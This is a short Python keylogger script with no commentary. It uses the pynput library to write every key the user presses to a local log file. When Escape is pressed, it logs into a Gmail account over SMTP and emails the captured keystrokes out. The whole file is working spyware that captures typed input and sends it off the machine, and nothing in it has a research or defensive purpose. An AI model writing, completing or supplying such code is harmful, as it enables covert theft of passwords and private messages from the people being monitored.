from time import sleep
from pynput import keyboard
import smtplib
def sendTo_Email():
    EMAIL = "************@gmail.com"
    PASS = "Password"
    with open("log.txt", "r") as log:
        message = log.read()
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(EMAIL, PASS)
        server.sendmail(EMAIL, EMAIL, message)
        server.quit()



def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(key.char)
            
        except AttributeError:
            f.write(" ")

def on_release(key):
    if key == keyboard.Key.esc:
        sendTo_Email()
        sleep(2)
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
